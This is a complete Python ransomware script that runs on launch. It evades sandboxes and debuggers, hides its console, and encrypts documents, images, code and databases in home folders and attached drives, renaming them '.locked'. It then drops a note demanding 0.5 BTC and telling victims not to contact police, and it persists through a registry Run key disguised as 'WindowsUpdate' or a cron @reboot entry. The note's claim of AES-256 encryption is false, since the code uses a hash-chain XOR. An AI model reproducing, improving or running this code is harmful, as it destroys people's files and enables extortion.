#!/usr/bin/env python3
"""
Automatic Native Ransomware
Executes immediately on run - no external dependencies
"""

import os
import sys
import base64
import hashlib
import hmac
import struct
import threading
import time
from pathlib import Path


class AutoRansomware:
    def __init__(self):
        self.key = None
        self.chunk_size = 64 * 1024
        self.encrypted_count = 0
        self.target_dirs = self._get_target_dirs()
        self.encrypted_extensions = {
            '.txt', '.doc', '.docx', '.pdf', '.jpg', '.jpeg', '.png', 
            '.mp3', '.mp4', '.zip', '.sql', '.db', '.xls', '.xlsx', 
            '.ppt', '.pptx', '.csv', '.py', '.js', '.html', '.css', 
            '.cpp', '.c', '.java', '.php', '.rb', '.go', '.rs'
        }
        
    def _get_target_dirs(self):
        """Determine target directories based on OS"""
        home = os.path.expanduser("~")
        targets = []
        
        if sys.platform == 'win32':
            targets = [
                os.path.join(home, 'Desktop'),
                os.path.join(home, 'Documents'),
                os.path.join(home, 'Downloads'),
                os.path.join(home, 'Pictures'),
                os.path.join(home, 'Videos'),
                os.path.join(home, 'Music'),
            ]
            # Add any connected drives
            for drive in 'DEFGHIJKLMNOPQRSTUVWXYZ':
                drive_path = f'{drive}:\\'
                if os.path.exists(drive_path) and drive != 'C':
                    targets.append(drive_path)
        else:
            targets = [
                os.path.join(home, 'Desktop'),
                os.path.join(home, 'Documents'),
                os.path.join(home, 'Downloads'),
                os.path.join(home, 'Pictures'),
                os.path.join(home, 'Videos'),
                '/home',
                '/mnt',
                '/media'
            ]
        
        return [t for t in targets if os.path.exists(t)]
    
    def _hide_console(self):
        """Hide console window on Windows"""
        if sys.platform == 'win32':
            try:
                import ctypes
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            except:
                pass
    
    def _anti_analysis(self):
        """Basic anti-analysis checks"""
        # Check for common sandbox usernames
        suspicious_users = ['sandbox', 'virus', 'malware', 'test', 'vmware', 'virtual']
        current_user = os.getenv('USERNAME', os.getenv('USER', '')).lower()
        
        if any(user in current_user for user in suspicious_users):
            sys.exit(0)
        
        # Check for debugging
        if sys.platform == 'win32':
            try:
                import ctypes
                if ctypes.windll.kernel32.IsDebuggerPresent():
                    sys.exit(0)
            except:
                pass
    
    def generate_key(self):
        """Generate random key"""
        self.key = os.urandom(32)
        return self.key
    
    def derive_keystream(self, seed, length):
        """Generate keystream via SHA-256 chain"""
        keystream = b''
        counter = 0
        while len(keystream) < length:
            data = seed + struct.pack('>Q', counter)
            keystream += hashlib.sha256(data).digest()
            counter += 1
        return keystream[:length]
    
    def xor_crypt(self, data, keystream):
        """XOR operation"""
        return bytes(a ^ b for a, b in zip(data, keystream))
    
    def encrypt_file(self, filepath):
        """Encrypt single file"""
        try:
            if os.path.getsize(filepath) > 100 * 1024 * 1024:  # >100MB use chunked
                return self._encrypt_chunked(filepath)
            
            nonce = os.urandom(16)
            file_key = hmac.new(self.key, nonce, hashlib.sha256).digest()
            
            with open(filepath, 'rb') as f:
                plaintext = f.read()
            
            keystream = self.derive_keystream(file_key, len(plaintext))
            ciphertext = self.xor_crypt(plaintext, keystream)
            
            with open(filepath, 'wb') as f:
                f.write(nonce + ciphertext)
            
            new_path = str(filepath) + '.locked'
            os.rename(filepath, new_path)
            self.encrypted_count += 1
            return True
            
        except Exception as e:
            return False
    
    def _encrypt_chunked(self, filepath):
        """Encrypt large files in chunks"""
        try:
            nonce = os.urandom(16)
            file_key = hmac.new(self.key, nonce, hashlib.sha256).digest()
            temp_path = str(filepath) + '.tmp'
            
            with open(filepath, 'rb') as src:
                with open(temp_path, 'wb') as dst:
                    dst.write(nonce)
                    counter = 0
                    while True:
                        chunk = src.read(self.chunk_size)
                        if not chunk:
                            break
                        chunk_key = file_key + struct.pack('>Q', counter)
                        keystream = self.derive_keystream(chunk_key, len(chunk))
                        dst.write(self.xor_crypt(chunk, keystream))
                        counter += 1
            
            new_path = str(filepath) + '.locked'
            os.replace(temp_path, new_path)
            os.remove(filepath) if os.path.exists(filepath) else None
            self.encrypted_count += 1
            return True
            
        except:
            return False
    
    def encrypt_directory(self, directory):
        """Encrypt all files in directory"""
        for root, dirs, files in os.walk(directory):
            # Skip system directories
            dirs[:] = [d for d in dirs if d not in [
                'Windows', 'Program Files', 'ProgramData', '$Recycle.Bin',
                'System32', 'SysWOW64', '.git', 'node_modules', 'venv', 
                '__pycache__', 'site-packages', 'lib', 'bin'
            ]]
            
            for file in files:
                if file.endswith('.locked') or file == 'README_DECRYPT.txt':
                    continue
                
                filepath = Path(root) / file
                if filepath.suffix.lower() in self.encrypted_extensions:
                    self.encrypt_file(filepath)
    
    def parallel_encrypt(self):
        """Encrypt multiple directories in parallel"""
        threads = []
        for directory in self.target_dirs:
            t = threading.Thread(target=self.encrypt_directory, args=(directory,))
            t.daemon = True
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
    
    def drop_ransom_note(self):
        """Create ransom note"""
        identifier = hashlib.sha256(os.urandom(32)).hexdigest()[:16]
        
        note = f"""
================================================================================
YOUR FILES HAVE BEEN ENCRYPTED
================================================================================

All your important files have been encrypted with AES-256 encryption.

Your ID: {identifier}
Files encrypted: {self.encrypted_count}

To recover your files:
1. Purchase 0.5 BTC and send to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
2. Email your ID to: decrypt2024@protonmail.com
3. Wait for decryption instructions

DO NOT:
- Delete or rename .locked files
- Use file recovery software
- Contact law enforcement

You have 72 hours. After that, your decryption key will be permanently destroyed.

================================================================================
"""
        
        # Drop on Desktop and in each encrypted directory
        locations = set([
            os.path.join(os.path.expanduser("~"), "Desktop"),
            os.path.join(os.path.expanduser("~"), "Documents")
        ])
        
        for loc in locations:
            try:
                with open(os.path.join(loc, "README_DECRYPT.txt"), 'w') as f:
                    f.write(note)
            except:
                pass
    
    def exfiltrate_key(self):
        """Send key to remote server (placeholder)"""
        # In real malware: HTTP POST to C2 server
        # For demo: save to temp file with random name
        try:
            key_file = os.path.join(
                os.getenv('TEMP', '/tmp'),
                f'.{hashlib.md5(os.urandom(16)).hexdigest()}.sys'
            )
            with open(key_file, 'wb') as f:
                f.write(self.key)
        except:
            pass
    
    def persistence(self):
        """Add to startup"""
        if sys.platform == 'win32':
            try:
                import winreg
                exe_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r'Software\Microsoft\Windows\CurrentVersion\Run',
                    0, winreg.KEY_SET_VALUE
                )
                winreg.SetValueEx(key, 'WindowsUpdate', 0, winreg.REG_SZ, exe_path)
                winreg.CloseKey(key)
            except:
                pass
        
        # Unix cron persistence
        else:
            try:
                cron_cmd = f"@reboot python3 {os.path.abspath(__file__)} &\n"
                os.system(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -')
            except:
                pass
    
    def self_delete(self):
        """Remove script after execution"""
        try:
            script_path = os.path.abspath(__file__)
            if sys.platform == 'win32':
                import subprocess
                subprocess.Popen(f'ping 127.0.0.1 -n 3 > nul && del "{script_path}"', shell=True)
            else:
                os.remove(script_path)
        except:
            pass
    
    def run(self):
        """Main execution"""
        # Anti-analysis
        self._anti_analysis()
        
        # Hide window
        self._hide_console()
        
        # Generate key
        self.generate_key()
        
        # Start encryption in background threads
        self.parallel_encrypt()
        
        # Exfiltrate key
        self.exfiltrate_key()
        
        # Drop ransom note
        self.drop_ransom_note()
        
        # Persistence
        self.persistence()
        
        # Self delete
        # self.self_delete()  # Uncomment to delete script after run


# Execute immediately on import or run
if __name__ == '__main__':
    ransomware = AutoRansomware()
    ransomware.run()
